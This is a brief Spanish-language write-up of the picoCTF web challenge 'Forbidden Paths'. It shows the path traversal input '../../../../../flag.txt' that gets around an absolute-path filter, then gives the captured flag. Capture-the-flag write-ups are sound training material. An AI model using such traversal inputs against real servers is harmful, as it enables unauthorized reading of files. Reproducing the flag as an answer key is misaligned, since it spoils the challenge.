# Nombre del reto
### Forbidden Paths
## Objetivo
```
Can you get the flag? Here's the [website](http://saturn.picoctf.net:55827/). We know that the website files live in `/usr/share/nginx/html/` and the flag is at `/flag.txt` but the website is filtering absolute file paths. Can you get past the filter to read the flag?
```
## Solucion
``` shell 
../../../../../flag.txt
picoCTF{7h3_p47h_70_5ucc355_e5a6fcbc}

Encontramos como sulucion ingresar lo siguiente "../../../../../flag.txt" en el sitio web para que de la siguiente manera nos deje ver la bandera.

```
## Referencias
```
https://www.youtube.com/watch?v=QUbRxFXnFNY
```
